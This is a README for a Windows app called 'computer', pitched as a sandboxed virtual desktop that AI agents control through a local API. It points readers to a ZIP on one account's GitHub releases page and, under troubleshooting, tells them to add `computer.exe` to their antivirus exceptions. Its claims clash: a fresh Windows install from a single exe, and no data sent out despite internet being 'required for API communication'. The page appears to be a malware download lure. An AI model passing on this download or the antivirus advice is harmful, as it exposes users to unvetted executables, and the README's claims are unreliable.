# 🖥️ computer - Give your agent a computer 👾

[![Download Now](https://img.shields.io/badge/Download-Computer%20App-blue?style=for-the-badge&logo=github)](https://github.com/Angelic5166/computer/releases)

## 📖 What is computer?

computer is a simple yet powerful application that lets your AI agent interact with a virtual computer. Think of it as giving your digital assistant a desktop environment where it can browse files, run programs, and perform tasks just like a human would. Whether you're automating workflows, testing software, or exploring AI capabilities, computer provides a safe sandbox for your agent to operate.

## 🚀 Getting Started

Follow these steps to get computer running on your Windows machine:

1. **Visit the download link**  
   Visit this link to download the application from the official releases page.

2. **Choose the right version**  
   On the releases page, look for the latest version (usually at the top). The file name will be something like `computer-v1.0.0.zip`.

3. **Extract the files**  
   Once downloaded, right-click the ZIP file and select "Extract All..." Choose a folder you can easily find, like your Desktop or Documents.

4. **Run the application**  
   Open the extracted folder and double-click `computer.exe`. A window will open showing the virtual desktop.

5. **Connect your agent**  
   The application will display an API endpoint (usually `http://localhost:8080`). Your AI agent can connect to this address to start interacting with the virtual computer.

## 🎯 Features

- **Full virtual desktop** - Your agent gets a complete Windows-like environment with file explorer, calculator, notepad, and more pre-installed.
- **Safe sandboxing** - All agent actions are contained within the virtual machine. No changes affect your real computer.
- **Real-time visibility** - Watch your agent's actions in a live view window. See exactly what it sees.
- **Simple API** - One simple HTTP endpoint for your agent to connect. No complex setup required.
- **Snapshots and rollbacks** - Save the state of the virtual computer at any time. If something goes wrong, restore to a previous snapshot.
- **Custom software installation** - Install additional Windows programs into the virtual environment for your agent to use.

## 💻 System Requirements

To run computer smoothly on your Windows PC, ensure you have:

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **Processor:** Intel Core i3 or AMD equivalent (or better)
- **Memory:** 4 GB RAM minimum (8 GB recommended)
- **Storage:** 5 GB free disk space
- **Internet:** Required for initial download and API communication

## 📥 Download and Installation

[![Download Now](https://img.shields.io/badge/Download-Computer%20App-green?style=for-the-badge&logo=github)](https://github.com/Angelic5166/computer/releases)

Visit this link to download the application. Once downloaded, extract the ZIP file to a folder of your choice. Run `computer.exe` to start the virtual computer environment. The application will create a system tray icon and a window showing the virtual desktop.

## 📘 User Guide

### First Launch

When you first run computer, it will:

1. Create a default virtual machine with a fresh Windows installation.
2. Open a window showing the virtual desktop.
3. Start a local API server on port 8080.

### Using the Virtual Desktop

The virtual desktop looks and behaves like a real Windows desktop. You can:

- Click on the Start menu to see available applications
- Open File Explorer to browse folders and files
- Run Notepad, Calculator, Paint, and more
- Minimize, maximize, and close windows

### Connecting Your Agent

Your AI agent needs to connect to the API endpoint. Provide it with the URL shown in the application window (usually `http://localhost:8080`). The agent can then:

- View the screen contents as text
- Click on screen coordinates
- Type text into fields
- Press keyboard keys
- Read file contents
- Execute commands in the command prompt

### Taking Snapshots

To save the current state:

1. Click the "Snapshot" button in the application toolbar.
2. Give the snapshot a name (e.g., "Before installing software").
3. To restore a snapshot, click "Restore" and select the saved snapshot.

## 🛠️ Troubleshooting

**Problem: Application won't start**
- Ensure your antivirus isn't blocking the executable. Add `computer.exe` to your antivirus exceptions.
- Verify you have enough free disk space (5 GB minimum).

**Problem: Agent can't connect**
- Confirm the API server is running (check the application window for the URL).
- Ensure no firewall is blocking port 8080.
- Try restarting the application.

**Problem: Virtual computer is slow**
- Close other programs to free up memory.
- Consider upgrading your RAM if you have less than 8 GB.
- Reduce the virtual desktop resolution in settings (accessible from the system tray icon menu).

## 🔒 Privacy & Security

- computer runs entirely on your local machine. No data is sent to external servers.
- The virtual computer environment is completely isolated from your real system.
- All agent actions are logged locally for your review.
- You can delete the virtual machine at any time, removing all traces of agent activity.

## 🤝 Support

For help, feature requests, or bug reports:

- **GitHub Issues:** Visit the repository's Issues page
- **Email:** Not available (use GitHub Issues)

## 📄 License

This project is licensed under the MIT License - see the LICENSE file in the repository for details.

## 🙏 Acknowledgments

- Thanks to all contributors who made this project possible
- Inspired by the need for safe AI agent testing environments

Keywords: AI agent, virtual computer, desktop automation, sandbox environment, Windows application, API endpoint